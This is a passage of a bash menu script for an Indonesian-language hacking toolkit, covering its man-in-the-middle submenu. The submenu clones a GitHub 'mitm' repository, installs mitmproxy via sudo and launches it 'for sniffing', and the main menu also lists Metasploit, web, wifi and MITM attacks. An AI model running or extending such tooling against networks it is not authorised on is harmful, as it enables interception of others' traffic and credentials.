    clear
    baner
    echo
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall manInThemidle proxy - for sniffing\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun manInThemidle\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
		echo
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/mitm ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mmanInThemidle already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                spiner
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m manInThemidle \033[31;1mnot found\033[37;1m, installing manInThemidle!\n"
								cd $path/.data > /dev/null 2>&1
								git clone https://github.com/K1M4K-ID/mitm
								sudo apt-get install mitmproxy -y > /dev/null 2>&1
								sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                spiner
                echo

                fi

				sleep 3
				proxy

        elif [ $xyz = "2"  ];
        then
					if [[ -d $path/.data/mitm ]]; then
					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mmanInThemidle already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
					spiner
					echo
					sleep 2
					clear
					else
					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m manInThemidle \033[31;1mnot found\033[37;1m, installing manInThemidle!\n"
					cd $path/.data > /dev/null 2>&1
					git clone https://github.com/K1M4K-ID/mitm
					sudo apt-get install mitmproxy -y > /dev/null 2>&1
					sleep 0.025
					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
					printf '\033[31;1m'
					spiner
					echo

					fi
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
				sleep 2
				clear
				cd $path/.data/mitm;bash mitm.sh
				sleep 3
        proxy

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        proxy
        fi
}



# fungsi untuk menjalankan menu untuk web attack
function run_mitm_attack(){
        clear
        baner
        echo
        mitm
                if [ $xyz = "1"  ];
                then
                better
                run_mitm_attack

                elif [ $xyz = "2"  ];
                then
                proxy
                run_mitm_attack

								elif [ $xyz = "0"  ];
								then
								runer

                else
                printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
                sleep 2
                run_wifi_attack

                fi
}



function runer(){
    clear
    baner
    echo
    echo
    menu
    while true
    do
        case $xyz in
            1) run_information;;
            2) run_metasploit;;
            3) run_web_attack;;
            4) run_wifi_attack;;
            5) run_mitm_attack;;
            6) janda;sleep 3;runer;;
            0) keluar;exit;;
            *) printf "\033[31;1m[\033[32;1m!\033[31;1m]\033[37;1m please input in options . . .\n"
               sleep 3 && runer;;
        esac
    done

}

dependencies
sleep 1

clear
runer
